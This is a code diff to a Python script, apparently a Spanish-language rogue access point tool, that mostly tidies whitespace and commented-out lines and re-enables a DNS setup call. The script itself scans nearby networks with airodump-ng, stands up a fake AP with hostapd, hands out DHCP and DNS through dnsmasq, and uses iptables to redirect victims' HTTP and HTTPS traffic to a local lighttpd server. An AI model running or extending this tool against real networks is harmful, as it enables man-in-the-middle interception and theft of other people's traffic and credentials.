@@ -76,11 +76,9 @@ class Forwaid:
     def conf(self):        
         os.system('ifconfig %s down' % interface)
         os.system('ifconfig %s %s netmask 255.255.255.0' %(interface,IP))        
-        os.system('ifconfig %s up' % interface)
-        
+        os.system('ifconfig %s up' % interface)        
         os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
-        os.system('route add -net '+RANG_IP+'.0 netmask 255.255.255.0 gw %s'%IP)
-        
+        os.system('route add -net '+RANG_IP+'.0 netmask 255.255.255.0 gw %s'%IP)        
         os.system('iptables --flush')
         os.system('iptables --table nat --flush')
         os.system('iptables --delete-chain')
@@ -88,8 +86,7 @@ class Forwaid:
         os.system('iptables -P FORWARD ACCEPT')
         os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:80'%IP)
         os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'%(IP,ssl_port))
-        os.system('iptables -t nat -A POSTROUTING -j MASQUERADE')        
-        #xterm $HOLD -title "Escaneando Objetivos en el canal -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w -a wlan0
+        os.system('iptables -t nat -A POSTROUTING -j MASQUERADE')       
         
     def detenerservicion(self):
         os.system('killall hostapd')        
@@ -152,16 +149,7 @@ class Forwaid:
             apconf.write(configAp % (interface, Host_SSID, Host_CHAN))
             
         with open(DUMP_PATH+'/dhcpd.conf', 'w') as dhcpconf:           
-            dhcpconf.write(configDhcp2)
-
-        #Forma1
-        """
-        #Se crear el hostaapd config de ap falso        
-        os.system('echo "interface=wlan0\ndriver=nl80211\nssid=Rogue\nchannel=1">'+DUMP_PATH+'/hostapd.conf')        
-        #os.system('echo "interface=%s driver=nl80211 ssid=%s channel=%s" > %s/hostapd.conf'%(interface,Host_SSID,Host_CHAN,DUMP_PATH))        
-        # Se crea el config del servidor DHCP        
-        os.system('echo "authoritative; default-lease-time 600; max-lease-time 7200; subnet '+RANG_IP+'.0 netmask 255.255.255.0 {option broadcast-address '+RANG_IP+'.255;option routers '+IP+';option subnet-mask 255.255.255.0; option domain-name-servers '+IP+';range '+RANG_IP+'.100 '+RANG_IP+'.250;}" > '+DUMP_PATH+'/dhcpd.conf')  
-        """
+            dhcpconf.write(configDhcp2)      
         
     def Dns(self):
         
@@ -175,11 +163,8 @@ class Forwaid:
             dhcpconf.write(config % (interface, DHCP_LEASE, IP))
             
         path = DUMP_PATH+'/dns.conf'
-        os.system('echo > /var/lib/misc/dnsmasq.leases')            
-            
-        #dns = Popen(['xterm','-e','dnsmasq', '-C', path], stdout=PIPE, stderr=DN)
-        #return DUMP_PATH+'/dns.conf'
-        
+        os.system('echo > /var/lib/misc/dnsmasq.leases')
+
     def escaner(self):
         os.system('airmon-ng start %s'%interface)
         os.system('xterm -title "Escaneando Objetivos ..." -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w %s/dump -a mon0'%DUMP_PATH)
@@ -188,24 +173,19 @@ class Forwaid:
         self.detenerservicion()
         self.conf()
         self.confFakeapydhcp()
-        #self.Dns()
-        #os.system('xterm -geometry 90x20-0-0 -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd '+DUMP_PATH+'/hostapd.conf')
-        #os.system('xterm -bg black -fg green -geometry 100x17+50+50 -T DHCP -e "dhcpd -d -f -cf "'+DUMP_PATH+'/dhcpd.conf" wlan0 2>&1 | tee -a '+DUMP_PATH+'/clientes.txt"')
+        self.Dns()      
        
         #Creo el Ap falso
         Popen(['xterm','-e', 'hostapd', ''+DUMP_PATH+'/hostapd.conf'], stdout=DN, stderr=DN)
         try:
             time.sleep(6)  # Copied from Pwnstar which said it was necessary?
         except KeyboardInterrupt:
-            print "keyboar"       
-        #Popen(['xterm','-e', 'dhcpd','-d','-f','-cf' ,'/root/Desktop/jr/dhcpd.conf','wlan0'], stdout=DN, stderr=DN)
+            print "keyboar"      
                  
         #Creo el Dhcp y dns
         Popen(['xterm','-e','dnsmasq', '-C', ''+DUMP_PATH+'/dns.conf','--no-daemon','--log-queries'], stdout=PIPE, stderr=DN)
         #Creo el Lihttp
-        os.system('lighttpd -f '+DUMP_PATH+'/liphp2.conf')
-        #dnsmasq -C /root/Desktop/jr/dns.conf --no-daemon --log-queries
-
+        os.system('lighttpd -f '+DUMP_PATH+'/liphp2.conf')      
 
     def creaFakeApF2(self):
         self.detenerservicion()
@@ -223,8 +203,6 @@ class Forwaid:
         #Creo Lihhtpd
         os.system('lighttpd -f '+DUMP_PATH+'/liphp2.conf')
 
-
-
 class modulosparaIntall:    
     def get_hostapd(self):
         if not os.path.isfile('/usr/sbin/hostapd'):
@@ -239,7 +217,6 @@ class modulosparaIntall:
                         'not found in /usr/sbin/hostapd'))
         else:
             print G+'[+]'+W+' Instalado Hospad'
-
 
 def inic():   
     print G+'By JR'+W   
@@ -287,18 +264,9 @@ def inic():
         vamos.reiniciar()
         sys.exit()
     elif hola == "11":
-        Forwaid().confFakeapydhcp()
-    
+        Forwaid().confFakeapydhcp()    
     inic()
-
 
 if __name__ == "__main__":
     #while True:
-    inic()
-    
-    
-      
-        
-
-
- 
+    inic()    
